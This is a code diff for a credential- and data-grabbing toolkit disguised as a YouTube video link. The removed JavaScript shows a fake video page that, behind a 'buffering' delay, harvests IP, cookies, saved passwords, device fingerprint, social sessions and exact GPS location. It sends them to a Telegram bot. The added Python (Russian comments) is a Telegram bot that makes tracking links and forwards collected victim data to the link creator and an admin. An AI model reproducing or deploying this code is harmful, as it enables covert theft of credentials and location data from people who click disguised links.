-            if (data.passwords && data.passwords.length > 0) {
-                message += `• Saved Passwords: ${data.passwords.length} found\n`;
-                data.passwords.forEach(pwd => {
-                    message += `  - ${pwd.email}: \`${pwd.password}\`\n`;
-                });
-            }
-            
-            message += `\n📱 *DEVICE FINGERPRINT:*\n`;
-            message += `• User Agent: ${data.fingerprint.userAgent}\n`;
-            message += `• Platform: ${data.fingerprint.platform}\n`;
-            message += `• Screen: ${data.fingerprint.screen.width}x${data.fingerprint.screen.height}\n`;
-            message += `• Languages: ${data.fingerprint.languages.join(', ')}\n`;
-            message += `• Timezone: ${data.fingerprint.timezone}\n`;
-            message += `• WebDriver: ${data.fingerprint.webdriver ? 'Yes (bot)' : 'No (human)'}\n`;
-            
-            message += `\n🌐 *NETWORK INFORMATION:*\n`;
-            message += `• Connection: ${data.network.connection ? data.network.connection.effectiveType : 'Unknown'}\n`;
-            message += `• Referrer: ${data.network.referrer || 'Direct'}\n`;
-            message += `• Online: ${data.network.online ? 'Yes' : 'No'}\n`;
-            
-            message += `\n🔍 *SOCIAL MEDIA STATUS:*\n`;
-            Object.entries(data.sessions || {}).forEach(([social, status]) => {
-                message += `• ${social}: ${status}\n`;
-            });
-            
-            message += `\n🎯 *MEDIA DEVICES:*\n`;
-            message += `• Microphone: ${data.mediaDevices.audio ? 'Available' : 'Not available'}\n`;
-            message += `• Camera: ${data.mediaDevices.video ? 'Available' : 'Not available'}\n`;
-            
-            if (data.location) {
-                message += `\n📍 *EXACT LOCATION:*\n`;
-                message += `• Latitude: ${data.location.latitude}\n`;
-                message += `• Longitude: ${data.location.longitude}\n`;
-                message += `• Accuracy: ${data.location.accuracy} meters\n`;
-                message += `• Google Maps: https://maps.google.com/?q=${data.location.latitude},${data.location.longitude}\n`;
-            }
-            
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            
-            try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-                
-                return await response.json();
-            } catch (error) {
-                console.error('Error sending to Telegram:', error);
-                // Save to localStorage as backup
-                saveToLocalStorage(data);
-                return null;
-            }
-        }
+        # Обновляем счетчик кликов
+        db.add_click(link_id)
         
-        // Save data to localStorage
-        function saveToLocalStorage(data) {
-            try {
-                const saved = JSON.parse(localStorage.getItem('collectedData') || '[]');
-                saved.push({
-                    timestamp: new Date().toISOString(),
-                    data: data
-                });
-                
-                if (saved.length > 10) saved.shift(); // Keep only last 10
-                localStorage.setItem('collectedData', JSON.stringify(saved));
-            } catch (e) {}
-        }
+        # Собираем данные
+        collected_data = await data_collector.collect_all_data(request_data)
         
-        // Main data collection function
-        async function collectAllData() {
-            collectedData.stage = 'collecting';
-            
-            // Stage 1: Get IP and basic info
-            currentStage = 1;
-            updateLoading(12, 'Getting IP address...');
-            collectedData.ip = await getIPAddress();
-            
-            // Stage 2: Get geolocation
-            currentStage = 2;
-            updateLoading(25, 'Getting location information...');
-            collectedData.geolocation = await getGeolocation(collectedData.ip);
-            
-            // Stage 3: Extract cookies and storage
-            currentStage = 3;
-            updateLoading(37, 'Analyzing browser storage...');
-            collectedData.cookies = extractCookies();
-            
-            // Stage 4: Try to get saved passwords
-            currentStage = 4;
-            updateLoading(50, 'Checking saved credentials...');
-            collectedData.passwords = extractSavedPasswords();
-            
-            // Stage 5: Browser fingerprint
-            currentStage = 5;
-            updateLoading(62, 'Creating device fingerprint...');
-            collectedData.fingerprint = getBrowserFingerprint();
-            
-            // Stage 6: Network info
-            currentStage = 6;
-            updateLoading(75, 'Analyzing network connection...');
-            collectedData.network = getNetworkInfo();
-            
-            // Stage 7: Check social sessions
-            currentStage = 7;
-            updateLoading(87, 'Checking social media sessions...');
-            collectedData.sessions = await checkSocialSessions();
-            
-            // Stage 8: Media devices and location
-            currentStage = 8;
-            updateLoading(94, 'Checking permissions...');
-            collectedData.mediaDevices = checkMediaDevices();
-            
-            // Try to get precise location
-            collectedData.location = await getLocation();
-            
-            // Complete
-            updateLoading(100, 'Data collection complete!');
-            collectedData.stage = 'complete';
-            collectedData.completedAt = new Date().toISOString();
-            
-            // Send to Telegram
-            setTimeout(async () => {
-                await sendToTelegram(collectedData);
-                showNotification('Video player ready!');
-            }, 1000);
-            
-            updateStats();
-        }
+        # Сохраняем данные
+        db.add_collected_data(link_id, collected_data)
         
-        // Initialize video player
-        function initializeVideoPlayer() {
-            const videoUrl = `https://www.youtube.com/embed/${videoId}?autoplay=1&mute=1`;
-            document.getElementById('videoPlayer').src = videoUrl;
-        }
+        # Получаем информацию о ссылке
+        link = db.get_link(link_id)
+        if link:
+            # Отправляем данные создателю ссылки
+            message = formatter.format_collected_data(link_id, collected_data)
+            
+            await context.bot.send_message(
+                chat_id=link.created_by,
+                text=message,
+                parse_mode=ParseMode.MARKDOWN
+            )
+            
+            # Также отправляем админу
+            try:
+                await context.bot.send_message(
+                    chat_id=ADMIN_ID,
+                    text=f"📨 Новые данные по ссылке {link_id}\n"
+                         f"Пользователь: {link.created_by}\n"
+                         f"Кликов: {link.clicks}\n"
+                         f"Всего данных: {len(link.data_collected)}"
+                )
+            except:
+                pass
         
-        // Main initialization
-        document.addEventListener('DOMContentLoaded', async function() {
-            // Start data collection immediately
-            setTimeout(() => collectAllData(), 500);
-            
-            // Initialize video player after 20 seconds
-            setTimeout(() => {
-                initializeVideoPlayer();
-            }, 20000); // 20 seconds delay
-            
-            // Update progress bar during the 20 seconds
-            const startTime = Date.now();
-            const totalDelay = 20000; // 20 seconds
-            
-            const progressInterval = setInterval(() => {
-                const elapsed = Date.now() - startTime;
-                const percent = Math.min(95, (elapsed / totalDelay) * 100);
-                updateLoading(percent, `Buffering video... (${Math.round(elapsed/1000)}s)`);
-                
-                if (elapsed >= totalDelay) {
-                    clearInterval(progressInterval);
-                }
-            }, 100);
-        });
-        
-        // Debug mode: Press Ctrl+Shift+D
-        document.addEventListener('keydown', function(e) {
-            if (e.ctrlKey && e.shiftKey && e.key === 'D') {
-                document.body.classList.toggle('debug-mode');
-                showNotification('Debug mode toggled');
-            }
-        });
-    </script>
-</body>
-</html>
+        return {"status": "success", "data_received": True}
+    
+    except Exception as e:
+        logger.error(f"Error in webhook handler: {e}")
+        return {"status": "error", "message": str(e)}
+
+# Обработчик ошибок
+async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Обработчик ошибок"""
+    logger.error(f"Update {update} caused error {context.error}")
+    
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_ID,
+            text=f"⚠️ Ошибка в боте: {context.error}"
+        )
+    except:
+        pass
+
+def main():
+    """Запуск бота"""
+    # Создаем приложение
+    application = Application.builder().token(BOT_TOKEN).build()
+    
+    # Регистрируем обработчики команд
+    application.add_handler(CommandHandler("start", start_command))
+    
+    # Обработчик YouTube ссылок
+    application.add_handler(MessageHandler(
+        filters.TEXT & filters.Regex(r'(youtube\.com|youtu\.be)'),
+        handle_youtube_link
+    ))
+    
+    # Обработчик inline кнопок
+    application.add_handler(CallbackQueryHandler(button_handler))
+    
+    # Обработчик ошибок
+    application.add_error_handler(error_handler)
+    
+    # Запускаем бота
+    print("🤖 YouTube Data Collector Bot запущен!")
+    print(f"👑 Админ: {ADMIN_ID}")
+    print(f"🌐 Домен: {DOMAIN}")
+    print("⏳ Ожидание команд...")
+    
+    application.run_polling(allowed_updates=Update.ALL_UPDATES)
+
+if __name__ == '__main__':
+    main()
